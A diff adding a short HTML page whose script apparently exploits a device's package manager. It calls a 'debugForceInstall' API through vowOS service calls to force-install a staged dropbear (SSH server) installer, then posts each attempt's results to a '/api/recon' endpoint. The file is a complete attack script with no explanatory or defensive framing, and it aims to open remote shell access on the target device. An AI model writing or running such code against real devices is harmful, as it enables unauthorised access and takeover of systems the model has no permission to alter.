@@ -1,0 +1,35 @@
+<!doctype html>
+<!-- install attempt via the vendor's own pkgmgr API (debugForceInstall).
+     Installs /APPS/installer.ipk (the staged alvidaa dropbear installer). -->
+<html><head><meta charset="utf-8"><title>install-via-pkgmgr</title></head>
+<body><pre id="out">installing…</pre><script>
+(function () {
+  "use strict";
+  var out = document.getElementById("out");
+  var report = { started: new Date().toISOString(), tries: [] };
+  function save(tag) {
+    try {
+      var x = new XMLHttpRequest();
+      x.open("POST", "/api/recon", true);
+      x.setRequestHeader("Content-Type", "application/json");
+      x.send(JSON.stringify({ tag: tag, at: new Date().toISOString(), report: report }));
+    } catch (e) {}
+  }
+  function J(v) { try { return JSON.stringify(v).slice(0, 1500); } catch (e) { return String(v); } }
+  function call(service, args) {
+    try {
+      var r = vowOS.service.syncExecute(service, args);
+      return { service: service, args: J(args), ret: r && r.ret, msg: J(r && r.msg) };
+    } catch (e) { return { service: service, args: J(args), exception: String(e) }; }
+  }
+  setTimeout(function () {
+    report.tries.push(call("pkgmgr", { api: "debugForceInstall", args: { path: "/APPS/installer.ipk" } }));
+    save("t0");
+    setTimeout(function () {
+      report.tries.push(call("system/pkgmgr", { api: "debugForceInstall", args: { path: "/APPS/installer.ipk" } }));
+      save("pkgmgr-inst-end");
+      try { out.textContent = JSON.stringify(report, null, 1); } catch (e) {}
+    }, 3000);
+  }, 2000);
+})();
+</script></body></html>
